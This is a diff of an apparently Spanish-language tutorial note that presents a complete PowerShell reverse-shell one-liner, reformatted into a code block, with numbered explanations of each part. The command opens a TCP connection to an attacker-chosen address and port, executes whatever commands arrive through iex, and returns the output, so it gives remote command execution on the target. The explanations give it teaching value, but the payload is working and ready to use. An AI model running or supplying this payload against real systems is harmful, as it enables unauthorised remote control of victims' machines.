@@ -1,5 +1,8 @@
 one-liner de PowerShell para establecer una reverse shell:
-one-liner de PowerShell para establecer una reverse shell:
+
+```PowerShell
+powershell -c "$client = New-Object System.Net.Sockets.TcpClient('tu_ip', tu_puerto);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 
 1. `powershell -c "`: Esto indica que se está ejecutando PowerShell y que se proporcionará un comando a través de la opción `-c`, que permite ejecutar un comando como argumento de la línea de comandos de PowerShell.
     
@@ -24,8 +27,4 @@ one-liner de PowerShell para establecer una reverse shell:
 11. `;$stream.Flush()};`: Se vacía el búfer de salida para asegurarse de que todos los datos se envíen al atacante.
     
 12. `$client.Close()"`: Se cierra la conexión TCP con el atacante una vez que el bucle `while` ha terminado de ejecutarse.
-```
 
-powershell -c "$client = New-Object System.Net.Sockets.TcpClient('tu_ip', tu_puerto);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
-```
